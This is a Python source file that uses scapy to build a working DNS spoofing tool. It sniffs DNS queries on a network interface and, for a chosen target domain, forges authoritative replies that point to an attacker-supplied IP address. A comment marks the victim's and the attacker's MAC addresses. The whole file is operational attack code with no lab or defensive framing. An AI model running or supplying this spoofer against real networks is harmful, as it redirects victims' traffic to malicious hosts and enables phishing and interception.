import logging
from scapy.all import *


class DNSSpoofer:
    
    def __init__(self, target_domain: str, fake_ip: str, interface: str):
        self.target_domain = target_domain
        self.fake_ip = fake_ip
        self.interface = interface
    
    def run(self) -> None:
        logging.info("DNS spoofing for '{}' -> {} started".format(self.target_domain, self.fake_ip))
        
        try:
            logging.info("Starting listening for DNS queries on port 53")
            sniff(iface=self.interface, filter="udp port 53", prn=self.dns_spoof)
        except KeyboardInterrupt:
            logging.info("DNS spoofing stopped by user")
        except Exception as e:
            logging.error(e)
            return
            
        logging.info("DNS spoofing finished")
        
    @staticmethod
    def is_dns_query(pkt):
        return pkt.haslayer(DNS) and pkt[DNS].qr == 0
    
    @staticmethod
    def get_DNS_query_domain(pkt):
        return pkt[DNSQR].qname.decode()
    
    @staticmethod
    def craft_spoofed_DNS_response(pkt, fake_ip: str, query_domain: str, interface: str):
        # [fix 1] Ether layer!
        # dst: Victim's mac address (pkt[Ether].src)
        # src: attacker MAC address (get_if_hwaddr(interface))
        
        if not pkt.haslayer(Ether):
            return None

        spoofed_pkt = Ether(dst=pkt[Ether].src, src=get_if_hwaddr(interface)) / \
                      IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
                      UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) / \
                      DNS(id=pkt[DNS].id,
                          qd=pkt[DNS].qd,
                          aa=1,
                          qr=1,
                          an=DNSRR(rrname=query_domain, ttl=10, rdata=fake_ip))
        return spoofed_pkt
    
    def dns_spoof(self, pkt):
        logging.info("Packet received")
        if self.is_dns_query(pkt):
            logging.info("Packet is DNS query")
            
            query_domain = self.get_DNS_query_domain(pkt)
            logging.info("Domain in DNS query is '{}'".format(query_domain))
            
            if self.target_domain in query_domain:
                # logging.info("'{}' in DNS query is target domain '{}'".format(query_domain, self.target_domain))
                
                spoofed_response = self.craft_spoofed_DNS_response(pkt, self.fake_ip, query_domain, self.interface)
                # logging.info("Spoofed DNS response crafted")
                
                # logging.info("Spoofed DNS response sending via interface '{}'".format(self.interface))
                sendp(spoofed_response, iface=self.interface, verbose=0, count=3)
                logging.info("Spoofed DNS response sent via interface '{}'".format(self.interface))
            else:
                logging.info("'{}' in DNS query is NOT target domain '{}'".format(query_domain, self.target_domain))
        else:
            logging.info("Packet is NOT DNS query")
            
